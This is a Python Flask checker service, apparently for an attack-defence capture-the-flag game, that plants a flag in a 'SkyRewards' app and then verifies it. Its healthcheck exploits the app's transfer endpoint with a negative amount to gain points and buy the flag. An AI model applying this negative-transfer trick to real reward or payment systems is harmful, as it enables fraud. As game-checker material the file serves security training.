import requests
import hashlib
from flask import Flask, request, jsonify

app = Flask(__name__)


def inject_flag(target_host, flag, password):
    """
    sends a POST request to the SkyRewards admin endpoint
    to update the flag.
    """
    url = f"http://{target_host}:5000/admin/update_flag"
    headers = {"X-API-KEY": password}
    payload = {"flag": flag}

    try:
        # Send request
        response = requests.post(url, data=payload, headers=headers, timeout=5)

        # Check if it worked
        if response.status_code == 200:
            return "SUCCESS"
        else:
            return "FAILURE"

    except requests.exceptions.RequestException as e:
        return f"Error: {e}"


def run_healthcheck(target_host, flag):
    """
    If the exploit is still unpatched, check the flag is obtainable.
    """
    base_url = f"http://{target_host}:5000"
    flagHash = hashlib.md5(flag.encode()).hexdigest()[:10]

    session = requests.Session()

    try:
        # Sign up
        r = session.post(
            f"{base_url}/login",
            data={"username": flagHash, "password": flagHash, "action": "register"},
            timeout=5,
        )
        if "Account created" not in r.text and r.status_code != 200:
            return "FAILURE"

        # Login
        r = session.post(
            f"{base_url}/login",
            data={"username": flagHash, "password": flagHash, "action": "login"},
            timeout=5,
        )
        if "Dashboard" not in r.text:
            return "FAILURE"

    except Exception as e:
        return False, f"Auth Error: {e}"

    # Test vulnerability
    try:
        r = session.post(
            f"{base_url}/transfer",
            data={"recipient": "root", "amount": -5000000},
            timeout=5,
        )

        # If the transfer didn't work, double check it works at all
        if "Successfully transferred" not in r.text:
            r = session.post(
                f"{base_url}/transfer",
                data={"recipient": "root", "amount": 1},
                timeout=5,
            )
            if "Successfully transferred" not in r.text:
                return "FAILURE"

        # Buy the flag
        r = session.post(f"{base_url}/buy/4", timeout=5)

        if flag in r.text:
            return "SUCCESS"

        # Patched case, user must've fixed the vuln but flag was successfully stored.
        elif "Insufficient SkyPoints" in r.text:
            return "SUCCESS"
        else:
            return "FAILURE"

    except Exception as e:
        return e.__str__()


@app.route("/inject", methods=["POST"])
def inject():
    """
    API endpoint. Expects JSON:
    {"ip": "...", "flag": "...", "password": "..."}
    """
    data = request.get_json()

    # Check for all required fields including 'password'
    required_fields = ["ip", "flag", "password"]
    if not data or not all(field in data for field in required_fields):
        return (
            jsonify({"status": "error", "message": "Missing required parameters"}),
            400,
        )

    ip = data["ip"]
    flag = data["flag"]
    password = data["password"]

    result = inject_flag(ip, flag, password)
    if result != "SUCCESS":
        return jsonify({"status": "failure", "message": result})

    result = run_healthcheck(ip, flag)

    if result == "SUCCESS":
        return jsonify({"status": "success"})
    else:
        return jsonify({"status": "failure", "message": result})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8082)
